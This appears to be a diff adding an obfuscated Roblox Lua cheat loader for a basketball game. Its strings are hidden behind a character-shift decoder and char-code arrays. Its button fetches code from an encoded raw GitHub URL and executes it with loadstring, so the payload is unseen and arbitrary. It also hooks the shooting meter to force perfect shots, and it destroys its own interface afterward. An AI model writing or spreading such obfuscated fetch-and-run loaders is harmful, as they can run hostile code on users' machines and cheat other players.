@@ -1,0 +1,110 @@
+local _0x1a2b3c = Instance.new
+local _0x4d5e6f = game:GetService
+local _0x7g8h9i = Color3.fromRGB
+local _0x1j2k3l = UDim2.new
+local _0x4m5n6o = Vector2.new
+local _0x7p8q9r = UDim.new
+local _0x1s2t3u = Enum.Font
+local _0x4v5w6x = Enum.KeyCode
+local _0x7y8z9a = Enum.EasingDirection
+local _0x1b2c3d = Enum.EasingStyle
+
+local function _0xDecode(str)
+    local result = ""
+    for i = 1, #str do
+        result = result .. string.char(string.byte(str, i) - 5)
+    end
+    return result
+end
+
+local _0xVar1 = _0x1a2b3c(_0xDecode("XhwjjsLzn"))
+local _0xVar2 = _0x1a2b3c(_0xDecode("Kwfrj"))
+local _0xVar3 = _0x1a2b3c(_0xDecode("YjcyGzyyts"))
+local _0xVar4 = _0x1a2b3c(_0xDecode("ZNHtwsjw"))
+local _0xVar5 = _0x1a2b3c(_0xDecode("ZNHtwsjw"))
+local _0xVar6 = _0x1a2b3c(_0xDecode("ZNXywtpj"))
+local _0xVar7 = _0x4d5e6f(game, _0xDecode("Y|jjsXjw{nhj"))
+local _0xVar8 = _0x4d5e6f(game, _0xDecode("ZxjwNsuzySxjw{nhj"))
+local _0xVar9 = _0x4d5e6f(game, _0xDecode("Uqf~jwx"))
+
+_0xVar1.Name = _0xDecode("R~HzxytrlZN")
+_0xVar1.Parent = game.CoreGui
+_0xVar2.Parent = _0xVar1
+_0xVar2.BackgroundColor3 = _0x7g8h9i(50, 50, 50)
+_0xVar2.Position = _0x1j2k3l(0.5, 0, 0.5, 0)
+_0xVar2.Size = _0x1j2k3l(0, 200, 0, 100)
+_0xVar2.AnchorPoint = _0x4m5n6o(0.5, 0.5)
+_0xVar2.BackgroundTransparency = 1
+
+_0xVar4.CornerRadius = _0x7p8q9r(0, 15)
+_0xVar4.Parent = _0xVar2
+_0xVar6.Parent = _0xVar2
+_0xVar6.Color = _0x7g8h9i(0, 0, 0)
+_0xVar6.Thickness = 8
+
+_0xVar3.Parent = _0xVar2
+_0xVar3.BackgroundColor3 = _0x7g8h9i(100, 100, 100)
+_0xVar3.Size = _0x1j2k3l(1, 0, 1, 0)
+_0xVar3.Font = _0x1s2t3u.SourceSansBold
+_0xVar3.Text = _0xDecode("QtfiXhwnuy")
+_0xVar3.TextColor3 = _0x7g8h9i(255, 255, 255)
+_0xVar3.TextSize = 24
+_0xVar3.BackgroundTransparency = 1
+_0xVar5.CornerRadius = _0x7p8q9r(0, 15)
+_0xVar5.Parent = _0xVar3
+
+local function _0xFunc1(msg)
+    local sg = _0x4d5e6f(game, _0xDecode("XyfwyjwLzn"))
+    sg:SetCore(_0xDecode("XjsiStynknhfynts"), {
+        Title = _0xDecode("Xhwnuy$Qtfiji");
+        Text = msg;
+        Duration = 10;
+        Icon = "";
+    })
+end
+
+local function _0xFunc2()
+    _G.OBFHUBFREE = string.char(50,107,109,101,109,98,101,114,115,103,97,110,103)
+    loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,111,98,102,104,117,98,47,102,114,101,101,47,109,97,105,110,47,98,97,115,107,101,116,109,98,97,108,108)))()
+    getgenv().config = {Time = 0.045, Size = 0.9} 
+    local uis = _0xVar8
+    local plr = _0xVar9.LocalPlayer
+    local bar = plr.PlayerGui.Visual.Shooting.Bar
+    
+    uis.InputBegan:Connect(function(inp, gpe) 
+        if gpe then return end 
+        if inp.KeyCode == _0x4v5w6x.E then 
+            if plr.Character:FindFirstChild(string.char(66,97,115,107,101,116,98,97,108,108)) then 
+                while uis:IsKeyDown(_0x4v5w6x.E) do 
+                    bar:GetPropertyChangedSignal(string.char(83,105,122,101)):Connect(function() 
+                        if bar.Size.Y.Scale > getgenv().config.Size then 
+                            bar:TweenSize(_0x1j2k3l(1, 0, 1, 0), _0x7y8z9a.Out, _0x7p8q9r.Linear, getgenv().config.Time, true) 
+                            task.wait() 
+                            bar.Size = _0x1j2k3l(1, 0, 1, 0) 
+                        end 
+                    end) 
+                    task.wait() 
+                end 
+            end 
+        end 
+    end)
+    _0xFunc1(_0xDecode("Fzyt$Lwjjs$Jsfgqji$'$Fzyt$Lzfwi"))
+end
+
+local function _0xFunc3()
+    print(_0xDecode("Fyyjruynsl$yt$hqtxj$LZN333"))
+    if _0xVar1 then
+        print(_0xDecode("XhwjjsLzn$ktzsi1$ijxywt~nsl$ny$st|3"))
+        _0xVar1:Destroy()
+        print(_0xDecode("XhwjjsLzn$ijxywt~ji3"))
+    else
+        print(_0xDecode("XhwjjsLzn$sty$ktzsi&"))
+    end
+end
+
+_0xVar3.MouseButton1Click:Connect(function()
+    print(_0xDecode("Qtfi$Xhwnuy$gzyyts$hqnhpji3"))
+    _0xFunc2()
+    _0xFunc3()
+    print(_0xDecode("Itsj$Qtfinsl"))
+end)
